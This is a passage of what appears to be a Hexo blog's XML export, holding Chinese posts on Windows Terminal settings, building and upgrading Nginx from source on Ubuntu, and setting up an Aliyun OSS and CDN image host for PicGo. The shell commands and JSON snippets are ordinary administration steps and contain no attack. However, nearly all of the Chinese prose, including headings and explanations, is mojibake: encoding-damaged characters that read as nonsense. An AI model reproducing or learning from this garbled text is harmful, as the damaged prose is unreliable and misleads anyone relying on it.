class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+4&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+5&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h2 id="å…¶å®ƒå¤–è§‚é…ç½®"><a href="#å…¶å®ƒå¤–è§‚é…ç½®" class="headerlink" title="å…¶å®ƒå¤–è§‚é…ç½®"></a>å…¶å®ƒå¤–è§‚é…ç½®</h2><p>å¯åŠ¨åˆ—è¡¨å†…æ·»åŠ </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;experimental.retroTerminalEffect&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span>	<span class="comment">// å¤å¤é£æ ¼</span></span><br><span class="line"><span class="attr">&quot;font&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;weight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;medium&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span>	<span class="comment">// å­—ä½“è‡ªå®šä¹‰</span></span><br><span class="line"><span class="attr">&quot;startingDirectory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;//wsl$/kali-linux/&quot;</span>	<span class="comment">// åˆå§‹ç›®å½•</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç›´æ¥åœ¨è®¾ç½®é‡Œé¢æ“ä½œè®¾ç½®</p>
<p><img data-src="http://img.owq.world/2021/12/1730-e12888.png"></p>
]]></content>
      <categories>
        <category>é…ç½®è®°å½•</category>
      </categories>
      <tags>
        <tag>Terminal</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx å®‰è£…å‡çº§æ•™ç¨‹</title>
    <url>/51f3ce14/</url>
    <content><![CDATA[<blockquote>
<p>æ“ä½œç¯å¢ƒ: ubuntu 20.04.3<br>å®˜æ–¹æ–‡æ¡£: <span class="exturl" data-url="aHR0cHM6Ly93d3cubmdpbnguY29tL3Jlc291cmNlcy93aWtpL3N0YXJ0">https://www.nginx.com/resources/wiki/start</span></p>
</blockquote>
<h2 id="ç®€å•äº†è§£"><a href="#ç®€å•äº†è§£" class="headerlink" title="ç®€å•äº†è§£"></a>ç®€å•äº†è§£</h2><blockquote>
<p>Nginxæ˜¯å¼‚æ­¥æ¡†æ¶çš„ç½‘é¡µæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥ç”¨ä½œ<strong>åå‘ä»£ç†</strong>ã€<strong>è´Ÿè½½å‡è¡¡å™¨</strong>å’ŒHTTPç¼“å­˜ã€‚</p>
<p>è¯¥è½¯ä»¶ç”±ä¼Šæˆˆå°”Â·èµ›ç´¢è€¶å¤«åˆ›å»ºå¹¶äº2004å¹´é¦–æ¬¡å…¬å¼€å‘å¸ƒã€‚<br>2011å¹´æˆç«‹åŒåå…¬å¸ä»¥æä¾›æ”¯æŒã€‚<br>2019å¹´3æœˆ11æ—¥ï¼ŒNginxå…¬å¸è¢«F5 Networksä»¥6.7äº¿ç¾å…ƒæ”¶è´­ã€‚ </p>
<p>Nginxæ˜¯å…è´¹çš„å¼€æºè½¯ä»¶ï¼Œæ ¹æ®ç±»BSDè®¸å¯è¯çš„æ¡æ¬¾å‘å¸ƒã€‚</p>
</blockquote>
<h2 id="åŒ…ç®¡ç†å™¨å®‰è£…"><a href="#åŒ…ç®¡ç†å™¨å®‰è£…" class="headerlink" title="åŒ…ç®¡ç†å™¨å®‰è£…"></a>åŒ…ç®¡ç†å™¨å®‰è£…</h2><blockquote>
<p>åŒ…ç®¡ç†å™¨æä¾›çš„è½¯ä»¶åŒ…ä¼šæœ‰äº›è¿‡æ—¶ï¼Œä¸å»ºè®®ä½¿ç”¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install nginx</span><br></pre></td></tr></table></figure>

<h2 id="æºç å®‰è£…"><a href="#æºç å®‰è£…" class="headerlink" title="æºç å®‰è£…"></a>æºç å®‰è£…</h2><h3 id="ç›¸å…³åŒ…å®‰è£…"><a href="#ç›¸å…³åŒ…å®‰è£…" class="headerlink" title="ç›¸å…³åŒ…å®‰è£…"></a>ç›¸å…³åŒ…å®‰è£…</h3><ul>
<li><p>GCC<br>åŒ…å«å„ç§è¯­è¨€çš„ç¼–è¯‘å™¨, ç”¨æ¥ç¼–è¯‘Nginxçš„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install build-essential</span><br></pre></td></tr></table></figure>
</li>
<li><p>OpenSSL<br>æä¾›SSLæ”¯æŒ, å¦‚è®¾ç½®https</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">apt <span class="keyword">install</span> openssl libssl-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>PCRE<br>æä¾›æ­£åˆ™è¡¨è¾¾å¼è§£æ, å¦‚HTTPæ¨¡å—ä¸­åŒ¹é…è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install libpcre3 libpcre3-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>zlib</p>
<p>æä¾›äº†å¼€å‘äººå‘˜çš„å‹ç¼©ç®—æ³•, å¦‚HTTPå“åº”ä½¿ç”¨å‹ç¼©å‡å°‘ä¼ è¾“æµé‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install zlib1g-dev</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>ä¸€æ¬¡æ€§å®‰è£…</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install build-essential openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev</span><br></pre></td></tr></table></figure>

<h3 id="ä¸‹è½½ç¼–è¯‘"><a href="#ä¸‹è½½ç¼–è¯‘" class="headerlink" title="ä¸‹è½½ç¼–è¯‘"></a>ä¸‹è½½ç¼–è¯‘</h3><blockquote>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒNGINX å°†å®‰è£…åœ¨<code>/usr/local/nginx</code>.</p>
</blockquote>
<p>è¿›å…¥<span class="exturl" data-url="aHR0cHM6Ly9uZ2lueC5vcmcvZW4vZG93bmxvYWQuaHRtbA==">ä¸‹è½½é¡µé¢</span>, è·å–ç¨³å®šç‰ˆæœ¬ä¸‹è½½é“¾æ¥<br><img data-src="http://img.owq.world/2021/11/1650-4a1fe7.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.20.1.tar.gz</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºç›®å½•è¿›è¡ŒåŒ…ç®¡ç†ï¼ˆæ–¹ä¾¿ä¹‹åä½¿ç”¨å…¶å®ƒç‰ˆæœ¬ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p nginx/core</span><br><span class="line"><span class="built_in">mv</span> nginx-1.20.1.tar.gz nginx/core</span><br></pre></td></tr></table></figure>

<p>è§£å‹åŒ…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx/core</span><br><span class="line">tar -zxf nginx-1.20.1.tar.gz</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥èµ„æºæ–‡ä»¶ï¼Œæ‰§è¡Œconfigure</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.20.1/</span><br><span class="line"><span class="comment"># ç›´æ¥å®‰è£…ä¸ä¼šé…ç½®ç¯å¢ƒå˜é‡å’Œå®‰è£…æ¨¡å—ï¼Œå…·ä½“é…ç½®çœ‹ä¸‹ä¸€å°èŠ‚</span></span><br><span class="line">./configure</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">make</span></span><br></pre></td></tr></table></figure>

<p>å®‰è£…</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">make <span class="keyword">install</span></span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å…¨å±€å˜é‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/nginx/nginx /usr/local/bin</span><br></pre></td></tr></table></figure>



<h2 id="é…ç½®å®‰è£…ï¼ˆå¯é€‰ï¼‰"><a href="#é…ç½®å®‰è£…ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="é…ç½®å®‰è£…ï¼ˆå¯é€‰ï¼‰"></a>é…ç½®å®‰è£…ï¼ˆå¯é€‰ï¼‰</h2><blockquote>
<p>configureå‚æ•°è¯´æ˜ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9uZ2lueC5vcmcvZW4vZG9jcy9jb25maWd1cmUuaHRtbA==">ğŸšª</span><br>ä¸­æ–‡ç¿»è¯‘ -&gt; <a href="/nginx-configure/">ğŸšª</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--prefix=/usr/local/nginx \</span><br><span class="line">--sbin-path=/usr/local/nginx/nginx \</span><br><span class="line">--modules-path=/usr/local/nginx/modules \</span><br><span class="line">--conf-path=/usr/local/nginx/nginx.conf \</span><br><span class="line">--error-log-path=/usr/local/nginx/logs/error.log \</span><br><span class="line">--http-log-path=/usr/local/nginx/logs/access.log \</span><br><span class="line">--pid-path=/usr/local/nginx/logs/nginx.pid \</span><br><span class="line">--lock-path=/usr/local/nginx/logs/nginx.lock \</span><br><span class="line">--with-debug --with-compat --with-pcre-jit --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_auth_request_module --with-http_v2_module --with-http_dav_module --with-http_slice_module --with-threads --with-http_addition_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_sub_module --with-stream_ssl_module --with-mail_ssl_module --with-stream</span><br></pre></td></tr></table></figure>

<p>æœ€åä¼šè¾“å‡ºé…ç½®ä¿¡æ¯</p>
<p><img data-src="http://img.owq.world/2021/11/1702-d6315d.png"></p>
<h2 id="å¸è½½æ“ä½œ"><a href="#å¸è½½æ“ä½œ" class="headerlink" title="å¸è½½æ“ä½œ"></a>å¸è½½æ“ä½œ</h2><p>åœæ­¢nginxè¿›ç¨‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s stop</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤å®‰è£…ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /usr/local/nginx</span><br></pre></td></tr></table></figure>

<p>æ¸…é™¤ç¼–è¯‘ç¯å¢ƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make clean</span><br></pre></td></tr></table></figure>



<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><ul>
<li><p>å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœæ­¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s stop</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®‰å…¨é€€å‡º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s quit</span><br></pre></td></tr></table></figure>
</li>
<li><p>æµ‹è¯•é…ç½®æ–‡ä»¶è¯­æ³•æ˜¯å¦æ­£ç¡®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>
</li>
<li><p>æŸ¥çœ‹ç‰ˆæœ¬åŠé…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="ç‰ˆæœ¬å‡çº§"><a href="#ç‰ˆæœ¬å‡çº§" class="headerlink" title="ç‰ˆæœ¬å‡çº§"></a>ç‰ˆæœ¬å‡çº§</h2><blockquote>
<p>åœ¨ä¸åœæ­¢NginxæœåŠ¡çš„æƒ…å†µä¸‹è¿›è¡Œå¹³æ»‘å‡çº§</p>
</blockquote>
<p>å‡†å¤‡å·²ç¼–è¯‘å¥½çš„æ–°ç‰ˆç›®å½•(å®‰è£…æ­¥éª¤æ‰§è¡Œåˆ°<code>make install</code>ä¹‹å‰)<br>æ‰§è¡Œ<code>make install</code>çš„è¯ä¼š<strong>è¦†ç›–</strong>æ‰åŸæœ¬çš„é…ç½®æ–‡ä»¶</p>
<p><img data-src="http://img.owq.world/2021/11/1733-352115.png"></p>
<p>ä¸‹é¢æ“ä½œä¼šå°†<code>nginx-1.20.1</code>å‡çº§åˆ°<code>nginx-1.20.2</code></p>
<ol>
<li><p>å¤‡ä»½æ—§ç‰ˆnginxå¯æ‰§è¡Œæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/nginx</span><br><span class="line"><span class="built_in">cp</span> nginx nginx.old</span><br></pre></td></tr></table></figure>
</li>
<li><p>å°†æ–°ç‰ˆæœ¬ç¼–è¯‘ç›®å½•ä¸‹çš„objsä¸­çš„nginxæ›¿æ¢æ‰nginx</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> ~/nginx/core/nginx-1.20.2/objs/nginx /usr/local/nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶è¢«å ç”¨ä½¿ç”¨å‘½ä»¤å¼ºåˆ¶è¦†ç›–</span></span><br><span class="line"><span class="built_in">cp</span> -rfp ~/nginx/core/nginx-1.20.2/objs/nginx /usr/local/nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>æµ‹è¯•æ–°ç‰ˆæœ¬æ˜¯å¦æ­£å¸¸</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ‰§è¡Œ<code>make upgrade</code></p>
<p><img data-src="http://img.owq.world/2021/11/1750-91c660.png"></p>
</li>
</ol>
<p>å‘½ä»¤æ²¡æœ‰æŠ¥é”™å°±æˆåŠŸäº†~</p>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>é˜¿é‡Œäº‘OSS å›¾åºŠæ­å»º</title>
    <url>/bee760ec/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote>
<p>äº‹æƒ…èµ·å› æ˜¯smmsçš„é“¾æ¥åœ¨ç½‘ç«™å¤‡æ¡ˆåä¸çŸ¥ä¸ºä½•åŠ è½½ä¸äº†ï¼Œè€Œä¸”è¿˜å­˜åœ¨å›¾ç‰‡æ•°æ®ä¸¢å¤±æƒ…å†µï¼Œè€ƒè™‘åˆ°åŠ è½½é€Ÿåº¦å’Œç¨³å®šæ€§ï¼Œä¾¿å†³å®šä½¿ç”¨é˜¿é‡Œäº‘OSSï¼Œç”¨å®ƒæ¥æ­å»ºä¸ªäººå›¾åºŠã€‚</p>
</blockquote>
<h3 id="è¯´è¯´ä¼˜ç‚¹"><a href="#è¯´è¯´ä¼˜ç‚¹" class="headerlink" title="è¯´è¯´ä¼˜ç‚¹"></a>è¯´è¯´ä¼˜ç‚¹</h3><ul>
<li>å›¾åºŠé…ç½®ç®€å•</li>
<li>æ•°æ®ä¸ä¼šä¸¢å¤±</li>
<li>å›½å†…è®¿é—®é€Ÿåº¦å¿«</li>
<li>é˜¿é‡Œäº‘æœåŠ¡æ”¯æŒ</li>
</ul>
<h3 id="å‰ç½®æ¡ä»¶"><a href="#å‰ç½®æ¡ä»¶" class="headerlink" title="å‰ç½®æ¡ä»¶"></a>å‰ç½®æ¡ä»¶</h3><ul>
<li>é€šè¿‡IPCå¤‡æ¡ˆå¥½çš„åŸŸå</li>
<li>ä½¿ç”¨è¿‡PicGoä¸Šä¼ è¿‡å›¾ç‰‡</li>
</ul>
<h3 id="è¯·æ±‚æµç¨‹"><a href="#è¯·æ±‚æµç¨‹" class="headerlink" title="è¯·æ±‚æµç¨‹"></a>è¯·æ±‚æµç¨‹</h3><blockquote>
<p>å®Œæˆé…ç½®å¥½, è®¿é—®å›¾ç‰‡æ—¶å°†ä¼šæ˜¯è¿™æ ·çš„ä¸€ä¸ªæµç¨‹</p>
</blockquote>
<ul>
<li>å­åŸŸå(å¤–ç½‘è·³è½¬) -&gt; CDN(å†…ç½‘è®¿é—®) -&gt; OSS(èµ„æºæ–‡ä»¶)</li>
</ul>
<h2 id="åˆ›å»ºOSS"><a href="#åˆ›å»ºOSS" class="headerlink" title="åˆ›å»ºOSS"></a>åˆ›å»ºOSS</h2><p>æ‰“å¼€é˜¿é‡Œäº‘ <span class="exturl" data-url="aHR0cHM6Ly9vc3MuY29uc29sZS5hbGl5dW4uY29tL292ZXJ2aWV3">å¯¹è±¡å­˜å‚¨OSS</span><br>é“¾æ¥å¤±æ•ˆçš„è¯, æ‰‹åŠ¨ç‚¹å‡»å³ä¸Šè§’èœå•æ‰¾åˆ°<code>å¯¹è±¡å­˜å‚¨OSS</code>æ‰“å¼€</p>
<p><em><img data-src="http://img.owq.world/2021/11/2044-022e40.png" style="zoom: 50%;" /></em></p>
<p>æ‰¾åˆ°<code>Bucketåˆ—è¡¨</code>ç‚¹å‡»<code>åˆ›å»ºBucket</code></p>
<img data-src="http://img.owq.world/2021/11/1541-68155b.png" style="zoom:50%;" />

<p>è¿™é‡Œæ³¨æ„å‡ ä¸ªç‚¹å°±è¡Œäº†ï¼Œåç§°å’Œåœ°åŸŸè‡ªè¡Œé€‰æ‹©ï¼Œ<strong>å­˜å‚¨ç±»å‹</strong>é€‰æ‹©<strong>æ ‡å‡†å­˜å‚¨</strong>ï¼Œ<strong>è¯»å†™æƒé™</strong>é€‰æ‹©<strong>ç§æœ‰</strong>ï¼ˆ<em>ä¹‹åé€šè¿‡CDNåŠ é€Ÿè®¿é—®ï¼Œä¸èµ°å…¬ç½‘æµé‡</em>ï¼‰ï¼Œå…¶å®ƒæœåŠ¡ä¸€èˆ¬ç”¨ä¸åˆ°ï¼Œæ‰€ä»¥é€‰æ‹©ä¸å¼€é€šï¼Œç„¶åç‚¹å‡»ç¡®è®¤ã€‚</p>
<img data-src="http://img.owq.world/2021/11/1543-217218.png" style="zoom:67%;" />

<p>ç„¶åçœ‹çœ‹ä½ çš„ Bucketåˆ—è¡¨ æ˜¯ä¸æ˜¯å¤šäº†ä¸€ä¸ªBucket</p>
<p><img data-src="http://img.owq.world/2021/11/2055-4aa5bc.png"></p>
<h2 id="èµ„æºåŒ…è´­ä¹°"><a href="#èµ„æºåŒ…è´­ä¹°" class="headerlink" title="èµ„æºåŒ…è´­ä¹°"></a>èµ„æºåŒ…è´­ä¹°</h2><blockquote>
<p>å¦‚æœä½ å‚¨å­˜çš„æ•°æ®åªæœ‰å‡ G, ç”šè‡³ä¸åˆ°1Gçš„è¯ï¼Œæ˜¯æ²¡æœ‰è´­ä¹°çš„å¿…è¦çš„, å› ä¸ºä½¿ç”¨æŒ‰é‡è®¡ç®—ä»·æ ¼åè€Œä¼šæ¯”è´­ä¹°èµ„æºåŒ…ä¾¿å®œã€‚</p>
<p>å…·ä½“å¯ä»¥å‚è€ƒé˜¿é‡Œäº‘äº§å“ä»·æ ¼ -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cuYWxpeXVuLmNvbS9wcmljZS9wcm9kdWN0">ğŸšª</span></p>
</blockquote>
<p><img data-src="http://img.owq.world/2021/11/2125-8bdcd6.png"></p>
<p>æŒ‰å›¾ç¤ºè¿›å…¥è´­ä¹°èµ„æºåŒ…é¡µé¢</p>
<img data-src="http://img.owq.world/2021/11/2058-d7c8f7.png" style="zoom:50%;" />

<p>ç„¶åé€‰æ‹©å¯¹åº”å‚¨å­˜ä¸‹å•è´­ä¹°å³å¯</p>
<p><img data-src="http://img.owq.world/2021/11/2123-4c2bfd.png"></p>
<h2 id="é…ç½®åŸŸåç»‘å®š"><a href="#é…ç½®åŸŸåç»‘å®š" class="headerlink" title="é…ç½®åŸŸåç»‘å®š"></a>é…ç½®åŸŸåç»‘å®š</h2><blockquote>
<p>åªæœ‰ç»‘å®šå¥½åŸŸååæ‰èƒ½é…ç½®CDNåŠ é€Ÿ.</p>
</blockquote>
<p>æ‰“å¼€åˆšåˆšåˆ›å»ºçš„<code>Bucket</code></p>
<img data-src="http://img.owq.world/2021/11/2151-6ad1d9.png" style="zoom:50%;" />

<p>è¿›å…¥ä¼ è¾“ç®¡ç†, ç‚¹å‡»ç»‘å®šåŸŸå</p>
<img data-src="http://img.owq.world/2021/11/2204-213d3a.png" style="zoom:50%;" />



<p>è¾“å…¥è¦ç»‘å®šçš„å­åŸŸå, å‹¾ä¸Šè‡ªåŠ¨æ·»åŠ è§£æç„¶åæäº¤</p>
<img data-src="http://img.owq.world/2021/11/2210-888938.png" style="zoom: 50%;" />



<p>è¿™æ—¶å€™è®¿é—®åŸŸåä¼šè·³è½¬åˆ°osså¤„, ä½†æ˜¯å› ä¸º<code>Bucket</code>è®¾ç½®çš„æ˜¯ç§æœ‰, æ‰€ä»¥å¤–ç½‘æ˜¯æ²¡æ³•è®¿é—®é‡Œé¢çš„æ–‡ä»¶, ä½†æ˜¯é€šè¿‡CDNå´å¯ä»¥, æ‰€ä»¥æ¥ä¸‹æ¥é…ç½®CDN<br><img data-src="http://img.owq.world/2021/11/2214-250364.png" style="zoom: 67%;" /></p>
<h2 id="é…ç½®CDNåŠ é€Ÿ"><a href="#é…ç½®CDNåŠ é€Ÿ" class="headerlink" title="é…ç½®CDNåŠ é€Ÿ"></a>é…ç½®CDNåŠ é€Ÿ</h2><blockquote>
<p>CDNå¯ä»¥è®©ä½ å›¾ç‰‡åŠ è½½æ›´å¿«, æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡é˜¿é‡Œäº‘çš„CDNæ§åˆ¶å°é…ç½®ç¬¬ä¸€é“é˜²æŠ¤å¢™, é˜²æ­¢æœåŠ¡å™¨è¢«æ”»å‡», è·‘å¤ªå¤šæµé‡è€Œé€ æˆé‡‘é’±æŸå¤±.</p>
</blockquote>
<p>è¿›å…¥CDNé…ç½®</p>
<p><img data-src="http://img.owq.world/2021/11/2227-615f8f.png"></p>
<p><img data-src="http://img.owq.world/2021/11/2230-02d11e.png"></p>
<p>ç‚¹å‡»æ–°å¢æºç«™ä¿¡æ¯,é€‰æ‹©åˆšæ‰åˆ›å»ºçš„oss</p>
<img data-src="http://img.owq.world/2021/11/2231-eac809.png" style="zoom: 80%;" />

<p>  è¿›å…¥ä¸‹ä¸€æ­¥</p>
<p><img data-src="http://img.owq.world/2021/11/2232-255f3f.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€å¤§å †å¯é€‰é…ç½®äº†ï¼Œè¿™é‡Œç¨å¾®é…ç½®ä¸‹å®‰å…¨æ€§ï¼Œå…¶å®ƒçš„è¯·è‡ªè¡Œé˜…è¯»è¯´æ˜è¿›è¡Œé…ç½®<del>ç»å¯¹ä¸æ˜¯å› ä¸ºè¯´æ˜å¤ªè¯¦ç»†æˆ‘æ‡’çš„å†™</del></p>
<p><img data-src="http://img.owq.world/2021/11/2237-4ccd07.png"></p>
<p>ä¿®æ”¹é…ç½®è®¾ç½®å¸¦å®½å°é¡¶ï¼Œå¯ä»¥é¿å…è¢«æ¶æ„æ”»å‡»æˆ–åˆ·æµé‡è€Œäº§ç”Ÿé«˜é¢çš„CDNè´¦å•ã€‚</p>
<img data-src="http://img.owq.world/2021/11/2240-55d797.png" style="zoom: 50%;" />

<p>é…ç½®å¥½åæŒ‰è¿›å…¥ä¸‹ä¸€æ­¥æŒ‰ç³»ç»Ÿæç¤ºé…ç½®CNAMEï¼Œä¹‹åè¿™äº›éƒ½å¯ä»¥ä¿®æ”¹ï¼Œæ‰€ä»¥å¯ä»¥å…ˆèµ°ä¸€éæµç¨‹ç„¶åå›å¤´å†è¯¦ç»†é…ç½®ä¸‹ã€‚</p>
<h2 id="CDNé…ç½®"><a href="#CDNé…ç½®" class="headerlink" title="CDNé…ç½®"></a>CDNé…ç½®</h2><p>å›åˆ°Bucketç®¡ç†é…ç½®ä¸‹ç¼“å­˜è‡ªåŠ¨åˆ·æ–°ï¼Œå°†å…¶å¼€å¯.</p>
<p><img data-src="http://img.owq.world/2021/11/1229-76fcbb.png"></p>
<p>å…¨éƒ¨å‹¾ä¸Šå°±è¡Œäº†<br><img data-src="http://img.owq.world/2021/11/1230-af5e88.png" style="zoom: 80%;" /></p>
<p>å¼„å¥½åæ‰“å¼€<code>CDNæ§åˆ¶å°</code><br><img data-src="http://img.owq.world/2021/11/2246-aba139.png" alt="" style="zoom: 67%;" /></p>
<p>æ‰“å¼€é…ç½®</p>
<p><img data-src="http://img.owq.world/2021/11/1243-0192a4.png"></p>
<p>é…ç½®å›æºè®¾ç½®ï¼Œè®©é€šè¿‡CDNçš„é“¾æ¥å¯ä»¥è®¿é—®åˆ°OSSé‡Œé¢å†…å®¹ï¼Œé¡ºä¾¿æŒ‡å®šä¸‹å›æºåè®®ä¸ºhttp</p>
<p><img data-src="http://img.owq.world/2021/11/1246-6948f3.png"></p>
<p>å…¶å®ƒé…ç½®å¯ä»¥ç­‰æµç¨‹èµ°å®Œå†å»å¼„</p>
<h2 id="åˆ›å»ºç®¡ç†ç”¨æˆ·"><a href="#åˆ›å»ºç®¡ç†ç”¨æˆ·" class="headerlink" title="åˆ›å»ºç®¡ç†ç”¨æˆ·"></a>åˆ›å»ºç®¡ç†ç”¨æˆ·</h2><blockquote>
<p>ä¸“é—¨ç”¨æ¥è®¿é—®osså­˜å‚¨çš„è´¦æˆ·</p>
</blockquote>
<p>ç‚¹å‡»å³ä¸Šè§’çš„ä¸ªäººå¤´åƒï¼Œæ‰“å¼€è®¿é—®æ§åˆ¶</p>
<img data-src="http://img.owq.world/2021/11/2128-5d7085.png" style="zoom: 67%;" />

<p>åˆ›å»ºç”¨æˆ·</p>
<img data-src="http://img.owq.world/2021/11/2135-cdb631.png" style="zoom:50%;" />

<p>è¾“å…¥ç™»å½•å’Œæ˜¾ç¤ºåç§°,å‹¾ä¸Š <code>Open API è°ƒç”¨è®¿é—®</code>, ç„¶åç‚¹å‡»ç¡®è®¤</p>
<img data-src="http://img.owq.world/2021/11/2136-25099d.png" style="zoom:50%;" />

<p>åˆ›å»ºæˆåŠŸåè®°å¾—ä¿å­˜å¥½<code>AccessKey</code>ä¿¡æ¯</p>
<p><img data-src="http://img.owq.world/2021/11/2139-e4162c.png"></p>
<p>æ¥ä¸‹æ¥ä¸ºåˆšåˆšåˆ›å»ºçš„ç”¨æˆ·æ·»åŠ æƒé™</p>
<p><img data-src="http://img.owq.world/2021/11/2142-4c4b7f.png"></p>
<p>æ·»åŠ  <code>AliyunOSSFullAccess</code> ç”¨æ¥ç®¡ç†OSS, ç¡®è®¤å®Œæ¯•åç®¡ç†ç”¨æˆ·å°±é…ç½®å¥½äº†</p>
<img data-src="http://img.owq.world/2021/11/2143-3fcdd0.png" style="zoom:50%;" />

<h2 id="PicGOé…ç½®"><a href="#PicGOé…ç½®" class="headerlink" title="PicGOé…ç½®"></a>PicGOé…ç½®</h2><p>å°†åˆšåˆšç”Ÿæˆçš„<code>AccessKey</code>ä¿¡æ¯å¡«è¿›å»ï¼Œç„¶åå¡«å†™ä½ çš„<code>Bucket</code>åå’Œå­˜å‚¨åŒºåŸŸè¿˜æœ‰åŸŸåï¼Œå…¶å®ƒå¯ä»¥è‡ªå®šä¹‰ã€‚</p>
<img data-src="http://img.owq.world/2021/11/1214-2b0efd.png" style="zoom:50%;" />

<p>éšä¾¿ä¸Šä¼ ä¸€å¼ å›¾åƒï¼Œç„¶åè®¿é—®å›¾åƒåœ°å€æ­£å¸¸æ˜¾ç¤ºå°±æˆåŠŸäº†ï¼Œå¦‚æœ‰æ„å¤–è¯·å‚ç…§é˜¿é‡Œäº‘å¸®åŠ©æ–‡æ¡£<del>ç¬‘</del>ã€‚</p>
<h2 id="OSSç®¡ç†å™¨"><a href="#OSSç®¡ç†å™¨" class="headerlink" title="OSSç®¡ç†å™¨"></a>OSSç®¡ç†å™¨</h2><blockquote>
